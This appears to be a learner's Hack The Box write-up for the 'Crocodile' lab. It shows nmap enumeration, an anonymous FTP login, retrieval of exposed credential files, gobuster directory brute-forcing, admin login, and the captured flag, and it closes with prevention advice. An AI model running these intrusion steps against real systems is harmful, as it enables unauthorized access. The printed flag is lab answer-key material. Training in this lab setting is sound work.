# 🐊 HTB - Crocodile (Writeup)

## 🧠 Day X Learning

Today I learned how multiple vulnerabilities can be chained together:

* FTP misconfiguration
* Credential exposure
* Web login exploitation

---

## 🔍 Step 1: Nmap Enumeration

```bash
nmap -sC -sV <target-ip>
```

### Result:

* Port **21 → FTP (vsftpd 3.0.3)**
* Port **80 → HTTP (Apache 2.4.41)**

👉 Two attack surfaces:

* FTP
* Web application

---

## ⚔️ Step 2: FTP Exploitation

Tried anonymous login:

```bash
ftp <target-ip>
```

### Login:

```text
Username: anonymous
Password: (leave empty)
```

✅ Login successful

---

## 📂 Step 3: File Enumeration

Used:

```bash
ls
```

Found:

* `allowed.userlist`
* `allowed.userlist.passwd`

---

## 📥 Step 4: Download Files

```bash
get allowed.userlist
get allowed.userlist.passwd
```

---

## 🧠 Analysis

Files contained:

* Usernames
* Passwords

👉 Found credentials for:

```text
admin : <password>
```

---

## 🌐 Step 5: Web Enumeration

Opened:

```text
http://<target-ip>
```

👉 Normal website (no login visible)

---

## 🔍 Step 6: Directory Bruteforce

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt -x php,html
```

### Found:

```text
/login.php
```

---

## ⚔️ Step 7: Login Exploitation

Opened:

```text
http://<target-ip>/login.php
```

Used credentials from FTP:

```text
Username: admin
Password: (from file)
```

---

## 🚀 Step 8: Access Gained

✅ Successfully logged in
👉 Accessed admin panel

---

## 🏁 Result

Found flag:

```text
c7110277ac44d78b6a9fff2232434d16
```

---

## 🧠 Key Learnings

* Always check FTP for anonymous access
* Sensitive files should never be exposed
* Enumeration → Exploitation chain is powerful
* One small misconfiguration can lead to full access

---

## 🔐 Vulnerability

* Anonymous FTP enabled
* Credential leakage
* Weak access control

---

## 🛡️ Prevention

* Disable anonymous FTP
* Protect sensitive files
* Use proper authentication
* Restrict access to internal resources

---

## 🔥 Real Insight

> This machine shows how attackers don’t rely on one bug
> They combine multiple small weaknesses into a full compromise

---
